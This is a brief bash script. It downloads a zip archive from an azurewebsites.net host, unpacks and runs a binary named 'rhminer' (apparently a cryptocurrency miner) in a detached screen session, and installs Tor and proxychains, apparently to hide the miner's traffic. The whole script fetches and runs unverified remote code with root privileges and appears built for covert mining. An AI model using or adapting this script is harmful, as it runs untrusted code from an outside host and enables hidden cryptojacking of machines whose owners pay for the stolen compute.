#!/bin/bash
sudo apt update
sudo apt -y install apt-transport-https screen unzip
wget "http://addmail.azurewebsites.net/pascgg.zip" 
unzip pascgg.zip
cd pascgg
chmod +x rhminer
chmod +x start.sh
wget -q -O - https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | sudo apt-key add -
echo "deb https://deb.torproject.org/torproject.org $(lsb_release -cs) main" | sudo tee -a /etc/apt/sources.list
sudo apt update
sudo apt  -y install tor deb.torproject.org-keyring
sudo apt-get -y install proxychains
screen -d -m ./start.sh
